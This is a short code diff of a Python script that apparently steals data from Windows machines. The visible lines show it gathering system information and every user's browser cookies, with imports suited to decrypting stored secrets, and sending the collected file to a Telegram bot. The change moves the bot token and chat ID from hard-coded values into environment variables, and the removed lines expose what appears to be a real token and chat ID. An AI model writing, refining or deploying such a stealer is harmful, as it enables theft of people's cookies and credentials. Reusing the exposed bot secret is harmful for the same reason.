@@ -17,6 +17,9 @@ import psutil
 import requests
 import win32crypt
 from Cryptodome.Cipher import AES
+from dotenv import load_dotenv
+
+load_dotenv()
 
 
 def get_system_info():
@@ -179,8 +182,8 @@ def get_all_information():
     # Getting all users' cookies
     get_cookies(file_name)
 
-    token = '5227927310:AAH7cuA0lrI1rA7b9UR2hC_Qe4ymI9UaOjI'
-    chat_id = '513567545'
+    token = os.getenv('TOKEN')
+    chat_id = os.getenv('CHAT_ID')
     url = f'https://api.telegram.org/bot{token}/sendDocument?chat_id={chat_id}'
 
     # Trying to send file via telegram bot
